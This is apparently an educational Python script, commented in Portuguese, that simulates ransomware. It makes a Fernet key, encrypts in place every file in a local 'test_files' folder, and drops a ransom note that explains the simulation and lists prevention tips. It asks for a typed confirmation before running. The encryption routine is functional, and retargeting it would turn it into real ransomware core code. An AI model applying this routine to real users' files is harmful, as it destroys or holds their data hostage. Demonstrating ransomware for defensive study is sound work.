#!/usr/bin/env python3
"""
RANSOMWARE SIMULADO - FINS EDUCACIONAIS
Simula criptografia de arquivos para estudo de defesas
"""

from cryptography.fernet import Fernet
import os
import json
from datetime import datetime

# CONFIGURAÇÃO DE SEGURANÇA - Ambiente controlado apenas
TARGET_DIR = "test_files"  # Pasta específica para testes
KEY_FILE = "secret.key"
RANSOM_NOTE = "README_RESCATE.txt"

def generate_key():
    """Gera chave de criptografia"""
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as f:
        f.write(key)
    return key

def load_key():
    """Carrega chave existente"""
    return open(KEY_FILE, "rb").read()

def encrypt_file(filepath, key):
    """Criptografa arquivo individual"""
    f = Fernet(key)
    with open(filepath, "rb") as file:
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)
    with open(filepath, "wb") as file:
        file.write(encrypted_data)
    print(f"[+] Criptografado: {filepath}")

def create_ransom_note():
    """Cria mensagem de resgate simulada"""
    note = f"""
    =========================================
    RANSOMWARE SIMULADO - AMBIENTE EDUCACIONAL
    =========================================
    
    Data: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
    
    SEUS ARQUIVOS FORAM CRIPTOGRAFADOS.
    
    Esta é uma simulação educacional. Em um ataque real:
    - Criminosos exigiriam pagamento em criptomoeda
    - Não há garantia de recuperação dos dados
    - O prazo imposto cria pressão psicológica
    
    Para recuperar (simulação):
    1. Execute o script decrypt.py
    2. Forneça a chave correta
    
    PREVENÇÃO REAL:
    - Backups offline e regulares
    - Antivírus atualizado
    - Não abrir anexos suspeitos
    - Manter sistema atualizado
    
    =========================================
    """
    with open(RANSOM_NOTE, "w", encoding="utf-8") as f:
        f.write(note)
    print(f"[+] Nota de resgate criada: {RANSOM_NOTE}")

def main():
    print("=" * 50)
    print("RANSOMWARE SIMULADO - FINS EDUCACIONAIS")
    print("=" * 50)
    print(f"Alvo: Pasta '{TARGET_DIR}'")
    print("AVISO: Execute apenas em ambiente controlado!")
    print("=" * 50)
    
    # Verificação de segurança
    confirm = input("Confirma execução? (digite 'SIMULAR'): ")
    if confirm != "SIMULAR":
        print("[-] Execução cancelada")
        return
    
    # Verifica pasta alvo
    if not os.path.exists(TARGET_DIR):
        print(f"[-] Pasta {TARGET_DIR} não encontrada")
        return
    
    # Gera chave
    key = generate_key()
    print(f"[+] Chave gerada: {KEY_FILE}")
    
    # Criptografa arquivos
    encrypted_count = 0
    for filename in os.listdir(TARGET_DIR):
        filepath = os.path.join(TARGET_DIR, filename)
        if os.path.isfile(filepath):
            try:
                encrypt_file(filepath, key)
                encrypted_count += 1
            except Exception as e:
                print(f"[!] Erro em {filename}: {e}")
    
    # Cria nota de resgate
    create_ransom_note()
    
    print(f"\n[+] {encrypted_count} arquivo(s) criptografado(s)")
    print(f"[+] Chave salva em: {KEY_FILE}")
    print("[!] Guarde esta chave para descriptografia")

if __name__ == "__main__":
    main()
